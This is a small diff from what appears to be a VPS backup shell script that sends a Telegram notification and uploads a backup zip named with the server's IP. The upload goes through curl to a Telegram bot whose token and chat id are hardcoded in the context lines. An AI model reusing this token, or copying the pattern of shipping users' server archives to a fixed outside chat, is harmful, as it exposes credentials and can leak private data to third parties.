@@ -188,7 +188,7 @@ klik to download : $LINKBACKUP
 <i>Automatic Notification from</i>
 <i>Github YaddyKakkoii</i> 
 "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/Crystalllz"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://t.me/Crystalllz"}]]}'
-"
+
     bt=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
     ci=1117211252
     curl -F chat_id="$ci" -F document=@"FT-$IP-${DATEVPS}.zip" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
